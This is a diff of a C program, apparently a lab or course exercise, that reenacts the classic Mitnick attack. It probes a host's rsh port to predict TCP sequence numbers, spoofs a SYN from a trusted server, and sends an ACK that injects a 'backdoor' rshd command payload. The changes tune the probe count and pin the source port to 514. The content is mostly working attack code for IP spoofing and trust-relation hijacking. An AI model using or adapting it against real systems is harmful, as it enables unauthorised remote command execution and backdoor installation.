@@ -75,7 +75,7 @@ struct tcp_hdr {
 
 
 //function definitions
-uint32_t send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
 int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack);
 tcp_seq compute_next_seq(tcp_seq n1, tcp_seq n2);
 
@@ -181,14 +181,14 @@ int main (void)
 	}
 
 	//probe xterminal
-	tcp_seq seq_array[10]; //actually I onlly need 2
+	tcp_seq seq_array[3]; //actually I onlly need 2
 
 	printf("Starting probing\n");
-	for (i = 0; i < 10; i++)
+	for (i = 0; i < 3; i++)
 	{
-		printf("probe\n");
+		//printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
-		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
+		send_syn(514, 514, NULL, 0, l, xterm_ip, kevin_ip);
 		packet = pcap_next(handle, &header);
 
 		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
@@ -207,22 +207,15 @@ int main (void)
 	//compute nextseq
 	printf("predictions\n");
 	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]));
-	printf("%u\n", compute_next_seq(seq_array[2], seq_array[1]));
-	printf("%u\n", compute_next_seq(seq_array[3], seq_array[2]));
-	printf("%u\n", compute_next_seq(seq_array[4], seq_array[3]));
-  printf("%u\n", compute_next_seq(seq_array[5], seq_array[4]));
-  printf("%u\n", compute_next_seq(seq_array[6], seq_array[5]));
-  printf("%u\n", compute_next_seq(seq_array[7], seq_array[6]));
-  printf("%u\n", compute_next_seq(seq_array[8], seq_array[7]));
 
-	tcp_seq predicted_seq = compute_next_seq(seq_array[9], seq_array[8]);
+	tcp_seq predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
 
 	//exploit trust relation
 
 	//send syn impersonating the server
 	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
-	tcp_seq my_seq = send_syn(514, NULL, 0, l, xterm_ip, server_ip);
-	printf("sent spoofed syn, waiting a second\n");
+	tcp_seq my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
+	printf("sent spoofed syn with seq %u, waiting a second\n", my_seq);
 	sleep(1);
 	//send ack with predicted seq and inject backdoor
 	//the command interpretation of the payload is specified in the manpage rshd. Need null-terminated: stderr\0user\0user\0command\0
@@ -240,7 +233,7 @@ int main (void)
 }
 
 
-uint32_t send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
 {
 
 	libnet_ptag_t t;
@@ -248,7 +241,7 @@ uint32_t send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libn
 	uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
 
 	t = libnet_build_tcp(
-		libnet_get_prand(LIBNET_PRu16), //sp source port
+		src_port, //sp source port
 		dest_port,											//dp destinatin port
 		my_seq, //sequence number
     0, 															//ack number, can I send whatever?
@@ -318,12 +311,12 @@ int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t p
 		src_port, 											//sp source port
 		dest_port,											//dp destinatin port
 		my_seq, 												//sequence number
-    ack, 														//ack number, can I send whatever?
-    TH_ACK | TH_PUSH,													//control bit SYN
+    ack, 														//ack number?
+    TH_ACK | TH_PUSH,								//control bit SYN
 		2048, 													//window size, random is ok?
 		0,															//checksum, if 0 libnet autofills
 		10,															//urgent pointer
-		LIBNET_TCP_H + payload_s,					//len = tcp header + size of backdoor
+		LIBNET_TCP_H + payload_s,				//len = tcp header + size of backdoor
 		payload,												//payload backdoor
 		payload_s,											//payload size
 		l,															//pointer to libnet context
